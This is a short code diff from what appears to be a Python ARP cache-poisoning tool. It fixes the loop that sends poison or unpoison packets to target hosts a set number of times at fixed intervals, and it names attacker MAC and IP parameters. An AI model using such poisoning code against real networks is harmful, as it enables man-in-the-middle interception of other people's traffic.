@@ -155,13 +155,14 @@ def one_way_arp_end(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface):
 # @param should_poison - boolean to determine if it is poisoning or unpoisoning (True = poison, False = unpoison)
 # @param pkt_type - the type of packets to be sent (1 = request, 2 = reply)
 def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, targets, macAtk, ipAtk, iface, pkt_type, gratuitious=False):
-    for i in range(m):
+    while m > 0:
         if time.time() - last_sent_time > n: # if n seconds have passed => should poison/unpoison again
             if should_poison:
                 arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious)
             else:
                 arp_unpoison(targets, macAtk, ipAtk, iface, pkt_type)     
             last_sent_time = time.time()
+            m -= 1
 
 # Function to poison the arp tables of all targets 
 def arp_poison(targets, macAtk, ipAtk, iface, pkt_type, gratuitious):
